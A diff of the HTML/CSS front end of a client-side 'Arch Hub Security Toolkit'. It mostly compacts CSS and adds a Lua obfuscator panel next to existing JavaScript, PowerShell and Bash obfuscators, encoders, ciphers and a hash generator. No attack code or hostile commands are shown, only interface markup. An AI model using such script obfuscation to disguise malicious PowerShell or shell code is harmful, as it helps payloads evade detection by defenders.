@@ -33,19 +33,6 @@
   --sans: 'Inter', sans-serif;
 }
 
-@media (prefers-color-scheme: light) {
-  :root {
-    --bg-0: #060910;
-    --bg-1: #0d1220;
-    --bg-2: #131b2e;
-    --bg-3: #1a2540;
-    --bg-4: #223050;
-    --text-0: #f0f4ff;
-    --text-1: #b8c4e0;
-    --text-2: #7a8aaa;
-  }
-}
-
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
 html, body {
@@ -89,27 +76,12 @@ html, body {
   color: var(--text-0);
   text-decoration: none;
   user-select: none;
+  cursor: pointer;
 }
-.logo-icon {
-  width: 24px;
-  height: 24px;
-  position: relative;
-  flex-shrink: 0;
-}
+.logo-icon { width: 24px; height: 24px; position: relative; flex-shrink: 0; }
 .logo-icon svg { width: 100%; height: 100%; }
-.logo-sep {
-  width: 1px;
-  height: 20px;
-  background: var(--border-hi);
-  margin: 0 4px;
-}
-.logo-sub {
-  font-size: 11px;
-  font-weight: 400;
-  color: var(--text-3);
-  letter-spacing: 0.08em;
-  text-transform: uppercase;
-}
+.logo-sep { width: 1px; height: 20px; background: var(--border-hi); margin: 0 4px; }
+.logo-sub { font-size: 11px; font-weight: 400; color: var(--text-3); letter-spacing: 0.08em; text-transform: uppercase; }
 .topbar-spacer { flex: 1; }
 .topbar-badge {
   font-family: var(--mono);
@@ -153,7 +125,6 @@ html, body {
   gap: 9px;
   padding: 7px 16px;
   cursor: pointer;
-  border-radius: 0;
   color: var(--text-2);
   font-size: 13px;
   font-weight: 400;
@@ -162,34 +133,11 @@ html, body {
   position: relative;
   user-select: none;
 }
-.nav-item:hover {
-  color: var(--text-1);
-  background: var(--bg-2);
-}
-.nav-item.active {
-  color: var(--accent-hi);
-  background: var(--bg-2);
-  border-left-color: var(--accent);
-}
-.nav-item.active::after {
-  content: '';
-  position: absolute;
-  right: 0;
-  top: 50%;
-  transform: translateY(-50%);
-  width: 3px;
-  height: 60%;
-  background: var(--accent);
-  border-radius: 2px 0 0 2px;
-  opacity: 0;
-}
+.nav-item:hover { color: var(--text-1); background: var(--bg-2); }
+.nav-item.active { color: var(--accent-hi); background: var(--bg-2); border-left-color: var(--accent); }
 .nav-dot {
-  width: 7px;
-  height: 7px;
-  border-radius: 50%;
-  flex-shrink: 0;
-  background: var(--text-3);
-  transition: background 0.12s;
+  width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0;
+  background: var(--text-3); transition: background 0.12s;
 }
 .nav-item.active .nav-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
 .nav-item:hover .nav-dot { background: var(--text-2); }
@@ -208,12 +156,7 @@ html, body {
 .main::-webkit-scrollbar { width: 6px; }
 .main::-webkit-scrollbar-thumb { background: var(--bg-3); border-radius: 3px; }
 
-.tool-panel {
-  display: none;
-  flex-direction: column;
-  gap: 20px;
-  animation: panelIn 0.15s ease;
-}
+.tool-panel { display: none; flex-direction: column; gap: 20px; animation: panelIn 0.15s ease; }
 .tool-panel.active { display: flex; }
 
 @keyframes panelIn {
@@ -222,68 +165,24 @@ html, body {
 }
 
 /* ── PANEL HEADER ── */
-.panel-header {
-  display: flex;
-  align-items: flex-start;
-  gap: 14px;
-  padding-bottom: 16px;
-  border-bottom: 1px solid var(--border);
-}
+.panel-header { display: flex; align-items: flex-start; gap: 14px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
 .panel-icon {
-  width: 36px;
-  height: 36px;
-  border-radius: 8px;
-  background: var(--bg-3);
-  border: 1px solid var(--border);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-  color: var(--accent-hi);
+  width: 36px; height: 36px; border-radius: 8px; background: var(--bg-3);
+  border: 1px solid var(--border); display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; color: var(--accent-hi);
 }
 .panel-icon svg { width: 18px; height: 18px; }
-.panel-title {
-  font-size: 18px;
-  font-weight: 600;
-  color: var(--text-0);
-  line-height: 1.3;
-  font-family: var(--sans);
-}
-.panel-desc {
-  font-size: 12px;
-  color: var(--text-2);
-  margin-top: 2px;
-  line-height: 1.5;
-}
+.panel-title { font-size: 18px; font-weight: 600; color: var(--text-0); line-height: 1.3; }
+.panel-desc { font-size: 12px; color: var(--text-2); margin-top: 2px; line-height: 1.5; }
 
 /* ── CARD ── */
-.card {
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  overflow: hidden;
-}
+.card { background: var(--bg-1); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
 .card-head {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 10px 14px;
-  border-bottom: 1px solid var(--border);
-  background: var(--bg-2);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--bg-2);
 }
-.card-label {
-  font-family: var(--mono);
-  font-size: 11px;
-  font-weight: 500;
-  color: var(--text-2);
-  letter-spacing: 0.04em;
-  text-transform: uppercase;
-}
-.card-actions {
-  display: flex;
-  gap: 6px;
-  align-items: center;
-}
+.card-label { font-family: var(--mono); font-size: 11px; font-weight: 500; color: var(--text-2); letter-spacing: 0.04em; text-transform: uppercase; }
+.card-actions { display: flex; gap: 6px; align-items: center; }
 .card-body { padding: 14px; }
 
 /* ── TEXTAREA / INPUT ── */
@@ -308,256 +207,106 @@ textarea:focus, input[type="text"]:focus, input[type="number"]:focus, select:foc
 }
 textarea { min-height: 140px; }
 select {
-  -webkit-appearance: none;
-  appearance: none;
+  -webkit-appearance: none; appearance: none;
   background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236e56cf' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
-  background-repeat: no-repeat;
-  background-position: right 10px center;
-  padding-right: 30px;
-  cursor: pointer;
+  background-repeat: no-repeat; background-position: right 10px center;
+  padding-right: 30px; cursor: pointer;
 }
 select option { background: var(--bg-2); }
 
 /* ── BUTTONS ── */
 .btn {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  padding: 7px 16px;
-  border-radius: 5px;
-  border: none;
-  cursor: pointer;
-  font-family: var(--sans);
-  font-size: 12.5px;
-  font-weight: 500;
-  transition: all 0.12s;
-  text-decoration: none;
-  user-select: none;
-  white-space: nowrap;
+  display: inline-flex; align-items: center; gap: 6px; padding: 7px 16px;
+  border-radius: 5px; border: none; cursor: pointer; font-family: var(--sans);
+  font-size: 12.5px; font-weight: 500; transition: all 0.12s;
+  text-decoration: none; user-select: none; white-space: nowrap;
 }
 .btn svg { width: 13px; height: 13px; flex-shrink: 0; }
-.btn-primary {
-  background: var(--accent);
-  color: #fff;
-}
+.btn-primary { background: var(--accent); color: #fff; }
 .btn-primary:hover { background: var(--accent-hi); }
-.btn-secondary {
-  background: var(--bg-3);
-  color: var(--text-1);
-  border: 1px solid var(--border);
-}
-.btn-secondary:hover {
-  background: var(--bg-4);
-  color: var(--text-0);
-  border-color: var(--border-hi);
-}
-.btn-ghost {
-  background: transparent;
-  color: var(--text-2);
-  border: 1px solid transparent;
-  padding: 4px 8px;
-  font-size: 11px;
-}
-.btn-ghost:hover {
-  background: var(--bg-3);
-  color: var(--text-1);
-  border-color: var(--border);
-}
-.btn-danger {
-  background: rgba(239, 68, 68, 0.12);
-  color: var(--danger);
-  border: 1px solid rgba(239, 68, 68, 0.2);
-}
-.btn-danger:hover { background: rgba(239, 68, 68, 0.2); }
+.btn-secondary { background: var(--bg-3); color: var(--text-1); border: 1px solid var(--border); }
+.btn-secondary:hover { background: var(--bg-4); color: var(--text-0); border-color: var(--border-hi); }
+.btn-ghost { background: transparent; color: var(--text-2); border: 1px solid transparent; padding: 4px 8px; font-size: 11px; }
+.btn-ghost:hover { background: var(--bg-3); color: var(--text-1); border-color: var(--border); }
+.btn-danger { background: rgba(239,68,68,.12); color: var(--danger); border: 1px solid rgba(239,68,68,.2); }
+.btn-danger:hover { background: rgba(239,68,68,.2); }
 
 /* ── ROW / GRID ── */
-.row {
-  display: flex;
-  gap: 10px;
-  flex-wrap: wrap;
-  align-items: flex-end;
-}
+.row { display: flex; gap: 10px; flex-wrap: wrap; align-items: flex-end; }
 .row-nowrap { flex-wrap: nowrap; }
 .col { display: flex; flex-direction: column; gap: 6px; flex: 1; }
 .col-auto { flex: 0 0 auto; }
-.label {
-  font-size: 11px;
-  font-weight: 500;
-  color: var(--text-2);
-  letter-spacing: 0.03em;
-  font-family: var(--mono);
-}
+.label { font-size: 11px; font-weight: 500; color: var(--text-2); letter-spacing: 0.03em; font-family: var(--mono); }
 
 /* ── NOTICE ── */
 .notice {
-  padding: 8px 12px;
-  border-radius: 5px;
-  font-size: 12px;
-  font-family: var(--mono);
-  display: flex;
-  align-items: flex-start;
-  gap: 8px;
-  line-height: 1.5;
-  display: none;
+  padding: 8px 12px; border-radius: 5px; font-size: 12px; font-family: var(--mono);
+  display: none; align-items: flex-start; gap: 8px; line-height: 1.5;
 }
 .notice.show { display: flex; }
-.notice-ok { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.2); color: #4ade80; }
-.notice-warn { background: rgba(245,158,11,.08); border: 1px solid rgba(245,158,11,.2); color: #fbbf24; }
-.notice-err { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.2); color: #f87171; }
+.notice-ok  { background: rgba(34,197,94,.08);  border: 1px solid rgba(34,197,94,.2);  color: #4ade80; }
+.notice-warn{ background: rgba(245,158,11,.08); border: 1px solid rgba(245,158,11,.2); color: #fbbf24; }
+.notice-err { background: rgba(239,68,68,.08);  border: 1px solid rgba(239,68,68,.2);  color: #f87171; }
 
 /* ── OPTIONS GRID ── */
-.opts {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
-  gap: 10px;
-}
+.opts { display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 10px; }
 .opt-item {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  padding: 8px 10px;
-  background: var(--bg-2);
-  border: 1px solid var(--border);
-  border-radius: 5px;
-  cursor: pointer;
-  transition: border-color 0.1s, background 0.1s;
-  user-select: none;
+  display: flex; align-items: center; gap: 8px; padding: 8px 10px;
+  background: var(--bg-2); border: 1px solid var(--border); border-radius: 5px;
+  cursor: pointer; transition: border-color 0.1s, background 0.1s; user-select: none;
 }
 .opt-item:hover { background: var(--bg-3); border-color: var(--border-hi); }
-.opt-label {
-  font-size: 12px;
-  color: var(--text-1);
-  font-family: var(--sans);
-}
+.opt-label { font-size: 12px; color: var(--text-1); }
 .opt-cb {
-  width: 14px;
-  height: 14px;
-  border-radius: 3px;
-  border: 1.5px solid var(--border-hi);
-  background: var(--bg-0);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-  transition: background 0.1s, border-color 0.1s;
+  width: 14px; height: 14px; border-radius: 3px; border: 1.5px solid var(--border-hi);
+  background: var(--bg-0); display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; transition: background 0.1s, border-color 0.1s;
 }
-.opt-item.checked .opt-cb {
-  background: var(--accent);
-  border-color: var(--accent);
-}
+.opt-item.checked .opt-cb { background: var(--accent); border-color: var(--accent); }
 .opt-item.checked .opt-cb::after {
-  content: '';
-  display: block;
-  width: 8px;
-  height: 5px;
-  border-left: 1.5px solid #fff;
-  border-bottom: 1.5px solid #fff;
+  content: ''; display: block; width: 8px; height: 5px;
+  border-left: 1.5px solid #fff; border-bottom: 1.5px solid #fff;
   transform: rotate(-45deg) translateY(-1px);
 }
 
 /* ── STAT CHIPS ── */
-.stats-row {
-  display: flex;
-  gap: 10px;
-  flex-wrap: wrap;
-}
+.stats-row { display: flex; gap: 10px; flex-wrap: wrap; }
 .stat-chip {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  padding: 5px 10px;
-  background: var(--bg-2);
-  border: 1px solid var(--border);
-  border-radius: 20px;
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--text-2);
+  display: flex; align-items: center; gap: 6px; padding: 5px 10px;
+  background: var(--bg-2); border: 1px solid var(--border); border-radius: 20px;
+  font-family: var(--mono); font-size: 11px; color: var(--text-2);
 }
 .stat-chip span { color: var(--accent-hi); font-weight: 500; }
 
 /* ── DASHBOARD ── */
-.dash-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-  gap: 10px;
-}
+.dash-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
 .dash-card {
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  padding: 16px;
-  cursor: pointer;
-  transition: border-color 0.12s, background 0.12s, transform 0.12s;
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
+  background: var(--bg-1); border: 1px solid var(--border); border-radius: 8px;
+  padding: 16px; cursor: pointer; transition: border-color 0.12s, background 0.12s, transform 0.12s;
+  display: flex; flex-direction: column; gap: 8px;
 }
-.dash-card:hover {
-  border-color: var(--accent);
-  background: var(--bg-2);
-  transform: translateY(-1px);
-}
+.dash-card:hover { border-color: var(--accent); background: var(--bg-2); transform: translateY(-1px); }
 .dash-card-icon {
-  width: 32px;
-  height: 32px;
-  border-radius: 7px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: var(--accent-hi);
-  background: var(--bg-3);
-  border: 1px solid var(--border);
+  width: 32px; height: 32px; border-radius: 7px; display: flex;
+  align-items: center; justify-content: center; color: var(--accent-hi);
+  background: var(--bg-3); border: 1px solid var(--border);
 }
 .dash-card-icon svg { width: 16px; height: 16px; }
-.dash-card-name {
-  font-size: 13px;
-  font-weight: 500;
-  color: var(--text-0);
-}
-.dash-card-cat {
-  font-size: 10px;
-  font-family: var(--mono);
-  color: var(--text-3);
-  text-transform: uppercase;
-  letter-spacing: 0.06em;
-}
+.dash-card-name { font-size: 13px; font-weight: 500; color: var(--text-0); }
+.dash-card-cat { font-size: 10px; font-family: var(--mono); color: var(--text-3); text-transform: uppercase; letter-spacing: 0.06em; }
 
 /* ── HASH GRID ── */
 .hash-row {
-  display: grid;
-  grid-template-columns: 60px 1fr auto;
-  gap: 6px;
-  align-items: center;
-  padding: 6px 0;
-  border-bottom: 1px solid var(--border);
+  display: grid; grid-template-columns: 60px 1fr auto; gap: 6px;
+  align-items: center; padding: 6px 0; border-bottom: 1px solid var(--border);
 }
 .hash-row:last-child { border-bottom: none; }
 .hash-name { font-family: var(--mono); font-size: 11px; color: var(--text-2); }
-.hash-val {
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--teal);
-  word-break: break-all;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  white-space: nowrap;
-}
+.hash-val { font-family: var(--mono); font-size: 11px; color: var(--teal); word-break: break-all; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
 /* ── FOOTER ── */
-.sidebar-footer {
-  margin-top: auto;
-  padding: 12px 16px 0;
-  border-top: 1px solid var(--border);
-}
-.sidebar-footer-text {
-  font-size: 10px;
-  color: var(--text-3);
-  font-family: var(--mono);
-  line-height: 1.6;
-}
-
-/* ── SCROLL TARGETS ── */
-#home-panel .dash-grid { max-width: 900px; }
+.sidebar-footer { margin-top: auto; padding: 12px 16px 0; border-top: 1px solid var(--border); }
+.sidebar-footer-text { font-size: 10px; color: var(--text-3); font-family: var(--mono); line-height: 1.6; }
 
 /* ── RESPONSIVE ── */
 @media (max-width: 700px) {
@@ -572,7 +321,7 @@ select option { background: var(--bg-2); }
 
 <!-- TOPBAR -->
 <header class="topbar">
-  <a class="logo" onclick="navigate('home')" style="cursor:pointer">
+  <div class="logo" onclick="navigate('home')">
     <div class="logo-icon">
       <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity="0.9"/>
@@ -583,7 +332,7 @@ select option { background: var(--bg-2); }
     Arch Hub
     <div class="logo-sep"></div>
     <span class="logo-sub">Security Toolkit</span>
-  </a>
+  </div>
   <div class="topbar-spacer"></div>
   <div class="topbar-badge">v2.4.1</div>
 </header>
@@ -591,58 +340,33 @@ select option { background: var(--bg-2); }
 <!-- SIDEBAR -->
 <nav class="sidebar">
   <div class="nav-section">Overview</div>
-  <div class="nav-item active" onclick="navigate('home')">
-    <div class="nav-dot"></div> Dashboard
-  </div>
+  <div class="nav-item active" onclick="navigate('home')"><div class="nav-dot"></div> Dashboard</div>
 
   <div class="nav-section">Obfuscators</div>
-  <div class="nav-item" onclick="navigate('js-obf')">
-    <div class="nav-dot"></div> JavaScript
-  </div>
-  <div class="nav-item" onclick="navigate('ps-obf')">
-    <div class="nav-dot"></div> PowerShell
-  </div>
-  <div class="nav-item" onclick="navigate('bash-obf')">
-    <div class="nav-dot"></div> Bash / Shell
-  </div>
+  <div class="nav-item" onclick="navigate('js-obf')"><div class="nav-dot"></div> JavaScript</div>
+  <div class="nav-item" onclick="navigate('ps-obf')"><div class="nav-dot"></div> PowerShell</div>
+  <div class="nav-item" onclick="navigate('bash-obf')"><div class="nav-dot"></div> Bash / Shell</div>
+  <div class="nav-item" onclick="navigate('lua-obf')"><div class="nav-dot"></div> Lua</div>
 
   <div class="nav-section">Encode / Decode</div>
-  <div class="nav-item" onclick="navigate('base64')">
-    <div class="nav-dot"></div> Base64
-  </div>
-  <div class="nav-item" onclick="navigate('url-enc')">
-    <div class="nav-dot"></div> URL Encode
-  </div>
-  <div class="nav-item" onclick="navigate('hex-enc')">
-    <div class="nav-dot"></div> Hex
-  </div>
-  <div class="nav-item" onclick="navigate('html-enc')">
-    <div class="nav-dot"></div> HTML Entity
-  </div>
+  <div class="nav-item" onclick="navigate('base64')"><div class="nav-dot"></div> Base64</div>
+  <div class="nav-item" onclick="navigate('url-enc')"><div class="nav-dot"></div> URL Encode</div>
+  <div class="nav-item" onclick="navigate('hex-enc')"><div class="nav-dot"></div> Hex</div>
+  <div class="nav-item" onclick="navigate('html-enc')"><div class="nav-dot"></div> HTML Entity</div>
 
   <div class="nav-section">Ciphers</div>
-  <div class="nav-item" onclick="navigate('xor')">
-    <div class="nav-dot"></div> XOR Cipher
-  </div>
-  <div class="nav-item" onclick="navigate('rot')">
-    <div class="nav-dot"></div> ROT13 / ROT-N
-  </div>
-  <div class="nav-item" onclick="navigate('caesar')">
-    <div class="nav-dot"></div> Caesar Cipher
-  </div>
+  <div class="nav-item" onclick="navigate('xor')"><div class="nav-dot"></div> XOR Cipher</div>
+  <div class="nav-item" onclick="navigate('rot')"><div class="nav-dot"></div> ROT13 / ROT-N</div>
+  <div class="nav-item" onclick="navigate('caesar')"><div class="nav-dot"></div> Caesar Cipher</div>
 
   <div class="nav-section">Hashing</div>
-  <div class="nav-item" onclick="navigate('hash')">
-    <div class="nav-dot"></div> Hash Generator
-  </div>
+  <div class="nav-item" onclick="navigate('hash')"><div class="nav-dot"></div> Hash Generator</div>
 
   <div class="nav-section">Utilities</div>
-  <div class="nav-item" onclick="navigate('string-tools')">
-    <div class="nav-dot"></div> String Tools
-  </div>
-  <div class="nav-item" onclick="navigate('charcode')">
-    <div class="nav-dot"></div> Char Code
-  </div>
+  <div class="nav-item" onclick="navigate('string-tools')"><div class="nav-dot"></div> String Tools</div>
+  <div class="nav-item" onclick="navigate('charcode')"><div class="nav-dot"></div> Char Code</div>
+  <div class="nav-item" onclick="navigate('diff')"><div class="nav-dot"></div> Text Diff</div>
+  <div class="nav-item" onclick="navigate('regex')"><div class="nav-dot"></div> Regex Tester</div>
 
   <div class="sidebar-footer">
     <div class="sidebar-footer-text">All processing<br>runs client-side.</div>
@@ -691,32 +415,18 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="loadSample('js-in', jsSample)">Sample</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="js-in" placeholder="// Paste JavaScript here..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="js-in" placeholder="// Paste JavaScript here..." spellcheck="false"></textarea></div>
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Options</span></div>
     <div class="card-body">
       <div class="opts" id="js-opts">
-        <div class="opt-item checked" data-key="renameVars" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Rename variables</span>
-        </div>
-        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Encode strings (hex)</span>
-        </div>
-        <div class="opt-item checked" data-key="hexLiterals" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Hex number literals</span>
-        </div>
-        <div class="opt-item" data-key="selfDefend" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Self-defending wrapper</span>
-        </div>
-        <div class="opt-item" data-key="deadCode" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Dead code injection</span>
-        </div>
-        <div class="opt-item" data-key="controlFlow" onclick="toggleOpt(this)">
-          <div class="opt-cb"></div><span class="opt-label">Control flow flatten</span>
-        </div>
+        <div class="opt-item checked" data-key="renameVars" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Rename variables</span></div>
+        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (hex)</span></div>
+        <div class="opt-item checked" data-key="hexLiterals" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Hex number literals</span></div>
+        <div class="opt-item" data-key="selfDefend" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Self-defending wrapper</span></div>
+        <div class="opt-item" data-key="deadCode" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Dead code injection</span></div>
+        <div class="opt-item" data-key="controlFlow" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Control flow flatten</span></div>
       </div>
     </div>
   </div>
@@ -736,9 +446,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="downloadText('js-out','obfuscated.js')">↓ Download</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="js-out" placeholder="// Output appears here..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="js-out" placeholder="// Output appears here..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -764,9 +472,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="loadSample('ps-in', psSample)">Sample</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="ps-in" placeholder="# Paste PowerShell script here..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="ps-in" placeholder="# Paste PowerShell script here..." spellcheck="false"></textarea></div>
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Technique</span></div>
@@ -798,9 +504,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="downloadText('ps-out','obfuscated.ps1')">↓ Download</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="ps-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="ps-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -825,9 +529,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="loadSample('bash-in', bashSample)">Sample</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="bash-in" placeholder="#!/bin/bash&#10;# Paste script here..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="bash-in" placeholder="#!/bin/bash&#10;# Paste script here..." spellcheck="false"></textarea></div>
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Method</span></div>
@@ -857,9 +559,63 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="downloadText('bash-out','obfuscated.sh')">↓ Download</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="bash-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea>
+    <div class="card-body"><textarea id="bash-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea></div>
+  </div>
+</div>
+
+<!-- ══════════════ LUA OBFUSCATOR ══════════════ -->
+<div class="tool-panel" id="lua-obf-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/>
+      </svg>
     </div>
+    <div>
+      <div class="panel-title">Lua Obfuscator</div>
+      <div class="panel-desc">Variable rename · string byte-encode · comment strip · loadstring wrapping</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Input — Lua source</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="clearField('lua-in','lua-out')">Clear</button>
+        <button class="btn btn-ghost" onclick="loadSample('lua-in', luaSample)">Sample</button>
+      </div>
+    </div>
+    <div class="card-body"><textarea id="lua-in" placeholder="-- Paste Lua script here..." spellcheck="false"></textarea></div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Options</span></div>
+    <div class="card-body">
+      <div class="opts" id="lua-opts">
+        <div class="opt-item checked" data-key="stripComments" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Strip comments</span></div>
+        <div class="opt-item checked" data-key="renameLocals" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Rename locals</span></div>
+        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (\\XX)</span></div>
+        <div class="opt-item" data-key="minify" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Minify whitespace</span></div>
+        <div class="opt-item" data-key="loadstring" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">loadstring wrapper</span></div>
+        <div class="opt-item" data-key="hexNumbers" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Hex number literals</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="obfuscateLua()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      Obfuscate
+    </button>
+    <button class="btn btn-secondary" onclick="copyOutput('lua-out')">Copy output</button>
+  </div>
+  <div class="notice" id="lua-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output — obfuscated</span>
+      <div class="card-actions">
+        <div class="stat-chip" id="lua-stats" style="display:none"><span id="lua-ratio">—</span> ratio</div>
+        <button class="btn btn-ghost" onclick="downloadText('lua-out','obfuscated.lua')">↓ Download</button>
+      </div>
+    </div>
+    <div class="card-body"><textarea id="lua-out" placeholder="-- Output appears here..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -878,9 +634,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="b64-in" placeholder="Paste text or base64 here..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="b64-in" placeholder="Paste text or base64 here..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -904,9 +658,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('b64-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="b64-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="b64-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -925,9 +677,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="url-in" placeholder="Paste URL or encoded string here..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="url-in" placeholder="Paste URL or encoded string here..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -952,9 +702,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('url-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="url-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="url-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -973,9 +721,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="hex-in" placeholder="Text or hex bytes (41 72 63 68 ...)..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="hex-in" placeholder="Text or hex bytes (41 72 63 68 ...)..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -983,7 +729,7 @@ select option { background: var(--bg-2); }
       <select id="hex-sep">
         <option value=" ">Space (41 72 63)</option>
         <option value="">None (417263)</option>
-        <option value="\\x">\\x prefix (\\x41\\x72\\x63)</option>
+        <option value="\x">\x prefix (\x41\x72\x63)</option>
         <option value="0x">0x prefix (0x41,0x72)</option>
       </select>
     </div>
@@ -1008,9 +754,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('hex-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="hex-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
